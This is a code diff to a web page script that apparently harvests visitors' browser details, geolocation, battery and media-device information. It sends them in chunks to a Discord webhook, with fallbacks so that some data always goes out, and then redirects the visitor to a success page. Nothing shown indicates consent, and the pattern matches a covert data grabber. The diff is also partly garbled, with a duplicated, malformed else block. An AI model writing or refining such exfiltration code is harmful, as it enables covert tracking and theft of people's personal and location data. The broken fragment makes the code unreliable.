@@ -460,8 +460,22 @@
             // Check if all async operations are complete
             if (!pendingOperations.geo && !pendingOperations.battery && !pendingOperations.media) {
                 console.log("All data collected, sending to webhook...");
-                sendDataToWebhook();
+                
+                // Log what data was collected to verify it exists
+                console.log("Data to send:", JSON.stringify(collectedData));
+                
+                // Update status message
+                statusElement.textContent = "Sending collected information...";
+                
+                // Add small delay before sending to ensure UI updates
+                setTimeout(sendDataToWebhook, 500);
             } else {
+                console.log("Still waiting for: " + 
+                    (pendingOperations.geo ? "geo " : "") + 
+                    (pendingOperations.battery ? "battery " : "") + 
+                    (pendingOperations.media ? "media " : ""));
+            }
+        }e {
                 console.log("Still waiting for: " + 
                     (pendingOperations.geo ? "geo " : "") + 
                     (pendingOperations.battery ? "battery " : "") + 
@@ -470,101 +484,114 @@
         }
         
         function formatDataForDiscord() {
-            let message = "**👤 User Information Collection 👤**\n\n";
+            // Create much smaller chunks for Discord's limits
+            let chunks = [];
+            let currentChunk = "**👤 User Information Collection 👤**\n\n";
             
             for (const [category, data] of Object.entries(collectedData)) {
                 if (Object.keys(data).length > 0) {
-                    message += `**📋 ${category.charAt(0).toUpperCase() + category.slice(1)} Information**\n`;
+                    const categoryHeader = `**📋 ${category.charAt(0).toUpperCase() + category.slice(1)} Information**\n`;
                     
-                    for (const [key, value] of Object.entries(data)) {
-                        message += `> **${key}:** ${value}\n`;
+                    // Check if adding category would exceed limit
+                    if (currentChunk.length + categoryHeader.length > 1900) {
+                        chunks.push(currentChunk);
+                        currentChunk = categoryHeader;
+                    } else {
+                        currentChunk += categoryHeader;
                     }
                     
-                    message += "\n";
+                    for (const [key, value] of Object.entries(data)) {
+                        const line = `> **${key}:** ${value}\n`;
+                        
+                        // Check if adding this line would exceed limit
+                        if (currentChunk.length + line.length > 1900) {
+                            chunks.push(currentChunk);
+                            currentChunk = line;
+                        } else {
+                            currentChunk += line;
+                        }
+                    }
+                    
+                    currentChunk += "\n";
                 }
             }
             
-            message += `**📅 Collected At:** ${new Date().toString()}\n`;
+            // Add timestamp to the last chunk
+            currentChunk += `**📅 Collected At:** ${new Date().toString()}\n`;
+            chunks.push(currentChunk);
             
-            // Limit Discord message to max character limit (2000 characters)
-            if (message.length > 2000) {
-                message = message.substring(0, 1995) + "...";
-            }
-            
-            return message;
+            return chunks;
         }
         
         function sendDataToWebhook() {
-            if (WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') {
-                console.log('Webhook URL not configured');
-                redirectToSuccess();
-                return;
-            }
+            console.log('Attempting to send data to webhook...');
             
-            const formattedMessage = formatDataForDiscord();
-            
-            const payload = {
-                content: formattedMessage
+            // Use a simple payload for first test
+            const basicPayload = {
+                content: "🔍 User data collection completed at " + new Date().toString(),
+                embeds: [{
+                    title: "Browser Information",
+                    description: JSON.stringify(collectedData.browser, null, 2)
+                }]
             };
             
-            // Add fallback in case of very large message
-            if (formattedMessage.length > 2000) {
-                // Split into multiple messages or send as a file if needed
-                payload.content = "User information collected successfully. See attached data.";
-                
-                // Create embeds to contain more info (up to 6000 chars total)
-                payload.embeds = [];
-                let currentEmbed = { description: "" };
-                let currentCategory = "";
-                
-                for (const [category, data] of Object.entries(collectedData)) {
-                    if (Object.keys(data).length > 0) {
-                        currentCategory = `**${category.charAt(0).toUpperCase() + category.slice(1)} Information**\n`;
-                        
-                        if (currentEmbed.description.length + currentCategory.length > 2000) {
-                            payload.embeds.push(currentEmbed);
-                            currentEmbed = { description: currentCategory };
-                        } else {
-                            currentEmbed.description += currentCategory;
-                        }
-                        
-                        for (const [key, value] of Object.entries(data)) {
-                            const line = `> **${key}:** ${value}\n`;
-                            
-                            if (currentEmbed.description.length + line.length > 2000) {
-                                payload.embeds.push(currentEmbed);
-                                currentEmbed = { description: line };
-                            } else {
-                                currentEmbed.description += line;
-                            }
-                        }
-                        
-                        currentEmbed.description += "\n";
-                    }
-                }
-                
-                if (currentEmbed.description) {
-                    payload.embeds.push(currentEmbed);
-                }
-            }
-            
+            // Send the initial test payload
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(basicPayload)
             })
             .then(response => {
-                console.log('Data sent successfully!');
-                redirectToSuccess();
+                if (!response.ok) {
+                    throw new Error(`HTTP error! Status: ${response.status}`);
+                }
+                console.log('Initial test message sent successfully!');
+                
+                // If successful, send the full data in multiple chunks
+                const chunks = formatDataForDiscord();
+                
+                // Send chunks sequentially
+                const sendNextChunk = (index) => {
+                    if (index >= chunks.length) {
+                        console.log('All chunks sent successfully!');
+                        redirectToSuccess();
+                        return;
+                    }
+                    
+                    const chunkPayload = {
+                        content: chunks[index] + (index < chunks.length - 1 ? "\n(Continued...)" : "\n(End of Report)")
+                    };
+                    
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(chunkPayload)
+                    })
+                    .then(r => {
+                        if (!r.ok) throw new Error(`HTTP error! Status: ${r.status}`);
+                        console.log(`Chunk ${index + 1}/${chunks.length} sent successfully`);
+                        // Wait a short time between chunks to avoid rate limiting
+                        setTimeout(() => sendNextChunk(index + 1), 500);
+                    })
+                    .catch(e => {
+                        console.error(`Error sending chunk ${index + 1}:`, e);
+                        sendNextChunk(index + 1); // Try next chunk anyway
+                    });
+                };
+                
+                // Start sending chunks
+                sendNextChunk(0);
             })
             .catch(error => {
-                console.error('Error sending data:', error);
-                // Try again with a simpler payload
-                const simplePayload = {
-                    content: "Failed to send complete data. Browser information: " + 
-                            JSON.stringify(collectedData.browser)
+                console.error('Error sending initial data:', error);
+                
+                // Simpler fallback attempt with just essential info
+                const fallbackPayload = {
+                    content: "**User Browser:** " + navigator.userAgent.substring(0, 1500)
                 };
                 
                 fetch(WEBHOOK_URL, {
@@ -572,10 +599,16 @@
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(simplePayload)
+                    body: JSON.stringify(fallbackPayload)
                 })
-                .then(() => redirectToSuccess())
-                .catch(() => redirectToSuccess());
+                .then(response => {
+                    console.log('Fallback data sent:', response.status);
+                    redirectToSuccess();
+                })
+                .catch(err => {
+                    console.error('Final fallback failed:', err);
+                    redirectToSuccess();
+                });
             });
         }
         
